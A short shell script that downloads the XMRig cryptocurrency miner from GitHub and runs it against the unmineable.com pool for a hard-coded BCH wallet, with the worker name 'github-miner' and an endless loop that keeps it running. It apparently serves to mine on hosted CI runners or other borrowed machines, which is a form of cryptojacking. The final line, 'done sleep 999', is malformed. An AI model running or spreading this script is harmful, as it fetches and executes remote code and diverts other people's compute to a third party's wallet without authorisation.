#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz
tar -xf xmrig-6.14.1-linux-x64.tar.gz
cd xmrig-6.14.1
./xmrig -o rx.unmineable.com:3333 -a rx -k u BCH:qzvnpllnhw8pzd44at8mx6q6scmw0xc34se2lhyggz.github-miner -p x --cpu 4
while [ 1 ]; do
sleep 3
done sleep 999
